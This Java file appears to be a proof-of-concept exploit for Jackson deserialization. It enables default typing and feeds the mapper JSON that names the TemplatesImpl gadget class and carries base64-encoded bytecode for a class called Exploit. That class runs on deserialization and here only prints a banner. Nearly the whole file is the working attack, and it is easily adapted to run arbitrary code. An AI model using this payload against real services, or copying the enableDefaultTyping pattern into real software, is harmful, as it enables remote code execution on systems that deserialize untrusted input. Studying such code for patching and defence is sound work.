import com.fasterxml.jackson.databind.ObjectMapper;

public class Test {

    static ObjectMapper mapper = new ObjectMapper().enableDefaultTyping();

    static class Data {
       public int id;
       public Object obj;
    }
            
    public static void main(String args[]) throws Exception {
        String JSON = 
                 "{'id': 124,\n" +
                   " 'obj':[ 'org.apache.xalan.xsltc.trax.TemplatesImpl',\n" +
                 "  {\n" +
                 "    'transletBytecodes' : [ 'yv66vgAAADQAPAcAAgEAB0V4cGxvaXQHAAQBAC9vcmcvYXBhY2hlL3hhbGFuL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEABjxpbml0PgEAAygpVgEACkV4Y2VwdGlvbnMHAAkBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAEQ29kZQoAAwAMDAAFAAYJAAMADgwADwAQAQAPdHJhbnNsZXRWZXJzaW9uAQABSQkAEgAUBwATAQAQamF2YS9sYW5nL1N5c3RlbQwAFQAWAQADZXJyAQAVTGphdmEvaW8vUHJpbnRTdHJlYW07CAAYAQDu4paI4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilojilojilZcg4paI4paI4paI4paI4paI4paI4pWXIOKWiOKWiOKWiOKVlyAgIOKWiOKWiOKWiOKVlyDilojilojilojilojilojilZcg4paI4paI4pWXICAg4paI4paI4pWXIOKWiOKWiOKWiOKWiOKWiOKWiOKVlyDilojilojilojilojilojilojilZcgIOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKVlwoAGgAcBwAbAQATamF2YS9pby9QcmludFN0cmVhbQwAHQAeAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVggAIAEBCOKWiOKWiOKVlOKVkOKVkOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KVmuKVkOKVkOKWiOKWiOKVlOKVkOKVkOKVneKWiOKWiOKVlOKVkOKVkOKVkOKWiOKWiOKVl+KWiOKWiOKWiOKWiOKVlyDilojilojilojilojilZHilojilojilZTilZDilZDilojilojilZfilZrilojilojilZcg4paI4paI4pWU4pWd4paI4paI4pWU4pWQ4pWQ4pWQ4paI4paI4pWX4paI4paI4pWU4pWQ4pWQ4paI4paI4pWXIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkQgAIgEA6uKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVl+KWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVlOKWiOKWiOKWiOKWiOKVlOKWiOKWiOKVkeKWiOKWiOKWiOKWiOKWiOKWiOKWiOKVkSDilZrilojilojilojilojilZTilZ0g4paI4paI4pWRICAg4paI4paI4pWR4paI4paI4paI4paI4paI4paI4pWU4pWdIOKWiOKWiOKVkeKWiOKWiOKVkeKWiOKWiOKVkQgAJAEA5uKVmuKVkOKVkOKVkOKVkOKWiOKWiOKVkeKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkeKWiOKWiOKVkeKVmuKWiOKWiOKVlOKVneKWiOKWiOKVkeKWiOKWiOKVlOKVkOKVkOKWiOKWiOKVkSAg4pWa4paI4paI4pWU4pWdICDilojilojilZEgICDilojilojilZHilojilojilZTilZDilZDilojilojilZcg4pWa4pWQ4pWd4pWa4pWQ4pWd4pWa4pWQ4pWdCAAmAQDo4paI4paI4paI4paI4paI4paI4paI4pWR4pWa4paI4paI4paI4paI4paI4paI4pWU4pWdICAg4paI4paI4pWRICAg4pWa4paI4paI4paI4paI4paI4paI4pWU4pWd4paI4paI4pWRIOKVmuKVkOKVnSDilojilojilZHilojilojilZEgIOKWiOKWiOKVkSAgIOKWiOKWiOKVkSAgIOKVmuKWiOKWiOKWiOKWiOKWiOKWiOKVlOKVneKWiOKWiOKVkSAg4paI4paI4pWRIOKWiOKWiOKVl+KWiOKWiOKVl+KWiOKWiOKVlwgAKAEA1uKVmuKVkOKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZDilZDilZDilZDilZ0gICAg4pWa4pWQ4pWdICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gICAgIOKVmuKVkOKVneKVmuKVkOKVnSAg4pWa4pWQ4pWdICAg4pWa4pWQ4pWdICAgIOKVmuKVkOKVkOKVkOKVkOKVkOKVnSDilZrilZDilZ0gIOKVmuKVkOKVnSDilZrilZDilZ3ilZrilZDilZ3ilZrilZDilZ0BAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAJTEV4cGxvaXQ7AQAJdHJhbnNmb3JtAQBQKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHADABAChvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAIZG9jdW1lbnQBABxMb3JnL2FwYWNoZS94YWxhbi94c2x0Yy9ET007AQAIaGFuZGxlcnMBADFbTG9yZy9hcGFjaGUveG1sL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQBzKExvcmcvYXBhY2hlL3hhbGFuL3hzbHRjL0RPTTtMb3JnL2FwYWNoZS94bWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMb3JnL2FwYWNoZS94bWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQAkTG9yZy9hcGFjaGUveG1sL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAMExvcmcvYXBhY2hlL3htbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFeHBsb2l0LmphdmEAIQABAAMAAAAAAAMAAQAFAAYAAgAHAAAABAABAAgACgAAAIUAAgABAAAAOyq3AAsqEGW1AA2yABESF7YAGbIAERIftgAZsgAREiG2ABmyABESI7YAGbIAERIltgAZsgAREie2ABmxAAAAAgApAAAAJgAJAAAACgAEAAsACgANABIADgAaAA8AIgAQACoAEQAyABIAOgATACoAAAAMAAEAAAA7ACsALAAAAAEALQAuAAIABwAAAAQAAQAvAAoAAAA/AAAAAwAAAAGxAAAAAgApAAAABgABAAAAFwAqAAAAIAADAAAAAQArACwAAAAAAAEAMQAyAAEAAAABADMANAACAAEALQA1AAIABwAAAAQAAQAvAAoAAABJAAAABAAAAAGxAAAAAgApAAAABgABAAAAHAAqAAAAKgAEAAAAAQArACwAAAAAAAEAMQAyAAEAAAABADYANwACAAAAAQA4ADkAAwABADoAAAACADs=' ],\n" +
                 "    'transletName' : 'oops!',\n" +
                 "    'outputProperties' : { }\n" +
                 "  }\n" +
                 " ]\n" +
                 "}";
        JSON = JSON.replace("'", "\"");

        mapper.readValue(JSON, Data.class);
    }

}